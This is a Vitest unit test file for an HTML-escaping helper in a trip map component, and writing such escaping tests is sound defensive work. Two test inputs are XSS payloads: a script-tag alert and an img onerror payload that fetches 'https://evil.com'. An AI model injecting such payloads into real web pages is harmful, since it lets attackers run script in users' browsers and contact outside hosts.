import { describe, it, expect } from 'vitest';
import { escapeHtml } from './TripJourneyMap';

describe('TripJourneyMap Security - escapeHtml', () => {
  it('escapes standard HTML injection tags', () => {
    const raw = '<script>alert("xss")</script>';
    expect(escapeHtml(raw)).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
  });

  it('escapes image onerror payloads', () => {
    const payload = '<img src=x onerror="fetch(\'https://evil.com\')">';
    expect(escapeHtml(payload)).toBe('&lt;img src=x onerror=&quot;fetch(&#39;https://evil.com&#39;)&quot;&gt;');
  });

  it('preserves clean alphanumeric titles and unicode emojis', () => {
    const clean = 'Dinner at Thalassa Greek Restaurant 🏖️ 🍽️';
    expect(escapeHtml(clean)).toBe('Dinner at Thalassa Greek Restaurant 🏖️ 🍽️');
  });

  it('escapes ampersands and quotes in store/merchant names', () => {
    const title = 'Marks & Spencer "Summer" Sale';
    expect(escapeHtml(title)).toBe('Marks &amp; Spencer &quot;Summer&quot; Sale');
  });
});
